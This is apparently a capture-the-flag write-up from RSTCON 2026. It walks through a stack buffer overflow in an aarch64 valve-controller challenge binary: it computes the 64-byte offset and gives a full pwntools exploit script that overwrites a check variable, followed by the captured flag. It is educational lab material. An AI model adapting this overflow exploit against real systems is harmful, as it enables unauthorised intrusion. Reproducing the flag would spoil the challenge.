---
title: "RSTCON 2026 CTF: Overflow Outlet Writeup"
---

## Overview
"Some hydro skid left its valve controller hanging off the network. It's sitting there waiting for an "actuator sequence," and the valve stays shut until the internal gate flips to the value it's after."

```
Arch:       aarch64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```


Due to `aarch64` architecture, you will have to use gdb-multiarch to debug and have the following installed:
```bash
sudo apt install qemu-user qemu-user-static gdb-multiarch
```

---
## Vulnerability
The binary reads in `256` bytes but stores it in a buffer of `64` bytes. There is a variable that stores a return value, and the code checks if it equals `0xCAFEBABEDEADBEEF`, if it does then `win()` gets called. A *stack canary* is present, but isn't relevant due to the buffer and the variable sitting before it.

![Vulnerable Code Photo](/assets/images/rstcon2026/outlet_vuln.png)

Here is the code for the `check_admin()` function.

![Function Code Photo](/assets/images/rstcon2026/outlet_checkadmin.png)

---
## Exploit Development
The goal here is to have an overflow that precisely reaches the correct address and contains the correct value.

In IDA, the disassembly shows the stack offsets and what gets stored in each variable. The buffer that `read` fills in is at `var_48`, and `var_8` holds the return value of `check_admin()`. To calculate the distance between them: `var_48 − var_8 = 0x48 − 0x08 = 0x40` = 64 bytes. So 64 bytes of padding lands next to the 8 bytes of the saved value.

![Variables Offset Photo](/assets/images/rstcon2026/outlet_variables.png)

---
## Final Pwn

```python
from pwn import *

BINARY = "./outlet"
HOST, PORT = "18.215.143.250", 9001

elf = context.binary = ELF(BINARY, checksec=False)
context.terminal = ["gnome-terminal", "--"]
context.log_level = "info"

gdbscript = """
set debuginfod enabled off
b *vuln
c
"""

def start():
    if args.GDB:
        return gdb.debug([BINARY], gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    return process([BINARY])

io = start()

payload = b"A" * 64
payload += p64(0xCAFEBABEDEADBEEF)
io.sendlineafter("sequence:", payload)

io.interactive()
```
```
rstcon{st4ck_sm4sh_opens_the_v4lve}
```